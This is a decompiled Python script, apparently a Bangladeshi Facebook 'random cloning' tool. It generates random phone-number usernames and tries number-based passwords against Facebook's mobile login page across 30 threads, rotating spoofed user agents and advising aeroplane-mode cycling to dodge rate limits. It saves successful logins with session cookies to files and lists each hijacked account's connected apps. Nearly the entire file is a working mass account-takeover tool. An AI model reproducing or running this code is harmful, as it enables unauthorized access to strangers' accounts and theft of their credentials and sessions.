# Decompile by Mardis (Tools By Tan-vai)
# Time Succes decompile : 2023-04-09 06:48:38.657478

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100043445555903', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://github.com/Tan-vai')
#---------------------------| Linex |---------------------------#
def clear():os.system('clear');print(logo)
def linex():
        print(f'\x1b[1;96m───────────────────────────────────────────')
#---------------------------| Logo |---------------------------#
logo=(f"""
\x1b[1;92m        ██   ██  █████  ██ ███    ██  
\x1b[1;92m         ██ ██  ██   ██ ██ ████   ██     
\x1b[1;92m          ███   ███████ ██ ██ ██  ██    
\x1b[1;92m         ██ ██  ██   ██ ██ ██  ██ ██    
\x1b[1;92m        ██   ██ ██   ██ ██ ██   ████   
\x1b[1;96m───────────────────────────────────────────
\x1b[1;96m\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m DEVLOPER  \x1b[1;91m••>>>  \x1b[1;92mXAIN-XD
\x1b[1;96m\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m FACEBOOK  \x1b[1;91m••>>>  \x1b[1;92mメXAIN一一ꪜ ヽヽ ヽ・　T.T
\x1b[1;96m\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m TOOLS     \x1b[1;91m••>>>  \x1b[1;92mRANDOM CLONING
\x1b[1;96m\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m VERSION   \x1b[1;91m••>>>  \x1b[1;93mV\x1b[1;96m/\x1b[1;93m20.8
\x1b[1;96m\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m STATUS    \x1b[1;91m••>>>  \x1b[1;93mPAID
\x1b[1;96m───────────────────────────────────────────""")
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    #os.system('xdg-open https://www.facebook.com/abutanim.chowdury')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[38;5;46m')
    v = 5.3
    update = ('5.3')
    update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[38;5;46m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
def api():
    rr = random.randint
    rc = random.choice
    versi = random.choice(["pt-BR","id","en"])
    bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
    ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    mmk = f"Mozilla/5.0 (Linux; U; Viera; {versi}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(70,200))} Safari/537.36 SmartTV"
    mm1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(25,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast)"
    return random.choice([ua1,ua2,ua3,ua4,ua5,mmk,mm1])
    
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :tanim = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :tanim = '√ 2009'
        elif uid[:8] in ['10000000']        :tanim = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tanim = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:tanim = ' 2010'
        elif uid[:6] in ['100001']          :tanim = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :tanim = '√ 2011/2012'
        elif uid[:6] in ['100004']          :tanim = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :tanim = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :tanim = '√ 2014/2015'
        elif uid[:6] in ['100009']          :tanim = '√ 2015'
        elif uid[:5] in ['10001']           :tanim = '√ 2015/2016'
        elif uid[:5] in ['10002']           :tanim = '√ 2016/2017'
        elif uid[:5] in ['10003']           :tanim = '√ 2018/2019'
        elif uid[:5] in ['10004']           :tanim = '√ 2019/2020'
        elif uid[:5] in ['10005']           :tanim = '√ 2020'
        elif uid[:5] in ['10006','10007','']:tanim = '√ 2021'
        elif uid[:5] in ['10008']           :tanim = '√ 2022'
        elif uid[:5] in ['10000']           :tanim = '√ 2015'
        else:tanim=''
    elif len(uid) in [9,10]:
        tanim = ' √ 2008/2009'
    elif len(uid)==8:
        tanim = '√ 2007/2008'
    elif len(uid)==7:
        tanim = '√ 2006/2007'
    else:tanim=''
    return tanim
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))    
    
    
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Example : {xr}\033[38;5;46m017, 018, 019{x}\033[38;5;46m')
    print("\033[38;5;46m───────────────────────────────────────────")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0181'
    rk4 = '0182'
    rk5 = '0151'                                
    code = random.choice([rk1,rk2,rk3,rk4,rk5])                      
    pww = input(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Choose \033[1;31m:\033[38;5;46m ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m]  EXAMPLE \033[1;31m:\033[38;5;46m 10000, 20000, 50000 \n\033[38;5;46m───────────────────────────────────────────\n\033[38;5;46m[\033[1;31m+\033[38;5;46m]  PUT CLONING LIMIT \033[1;31m:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[38;5;46m[\033[1;31m+\033[38;5;46m]  Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=30) as manshera:
        clear()
        tl = str(len(user))
        print(f'{x}\033[38;5;46m[\033[1;31m+\033[38;5;46m] THE PROCESS HAS BEEN STARTED')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOTAL IDS     \033[1;91m: \033[38;5;46m {xr}\033[38;5;46m'+tl)
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] WORK COUNTRY  \033[1;91m:  \033[38;5;46mBANGLADESH')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] USE NETWORK   \033[1;91m:  \033[38;5;46m2G, 3G, 4G, 5G ')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f"\033[38;5;46m───────────────────────────────────────────")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x}\033[38;5;46m───────────────────────────────────────────")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
                        'method': 'GET',
                        'path': 'https://www.facebook.com/?_rdc=1&_rdr',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'referer': 'https://mbasic.facebook.com/',
                        'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'upgrade-insecure-requests': '1',
                        'user-agent': api(),}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                oks.append(cid)       
                print(f'\r\r\x1b[1;97m|\x1b[1;91m»\x1b[1;97m| \x1b[1;92mSUCCESS \x1b[1;91m» \x1b[1;92m{uid} \x1b[1;97m| \x1b[1;92m{ps}  ')
                print(f"\r\r\x1b[1;97m|\x1b[1;91m»\x1b[1;97m| \x1b[1;92mCOOKIE\x1b[1;97m[🍪\x1b[1;97m] \x1b[1;91m» \x1b[1;92m sb=cracked_by.Xain-xd:tool;"+coki.replace("-1","1")+"\n")
                open('/sdcard/Xain-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')   
                cek_apk(session,coki)                      
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m[\033[38;5;46mXAIN-CP\033[1;31m]\033[38;5;46m ' +uid+ ' \033[1;31m●\033[38;5;46m ' +ps+        ' ''  \033[38;5;46m')
                open('/sdcard/Xain-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐅𝐈𝐍𝐃𝐈𝐍𝐆{x}]-[%s/%s]-[OK:{xr}%s{x}] '%(H,loop,tl,len(oks))),sys.stdout.flush() 
    except:
        pass

xxr()
  